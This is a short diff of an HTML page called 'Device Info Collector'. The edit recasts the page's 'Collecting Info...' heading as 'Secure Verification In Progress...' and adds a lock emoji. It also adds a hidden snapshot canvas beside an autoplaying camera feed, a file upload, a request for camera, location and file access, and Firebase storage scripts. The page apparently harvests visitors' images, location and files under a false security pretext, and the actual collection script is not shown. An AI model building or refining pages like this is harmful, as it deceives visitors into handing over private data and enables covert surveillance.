@@ -3,18 +3,23 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Device Info Collector</title>
-  <link rel="stylesheet" href="style.css"/>
+  <title>🔒 Device Info Collector</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <h1>📡 Collecting Info...</h1>
-  <video id="video" autoplay muted playsinline></video>
-  <input type="file" id="fileInput" multiple />
+  <h1>📡 Secure Verification In Progress...</h1>
+
+  <div class="card">
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="snapshotCanvas" style="display: none;"></canvas>
+    <input type="file" id="fileInput" multiple />
+    <p>✅ Allow camera, location, and upload files manually if needed.</p>
+  </div>
 
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js"></script>
-  
+
   <script type="module" src="./firebase-config.js"></script>
   <script type="module" src="./script.js"></script>
 </body>
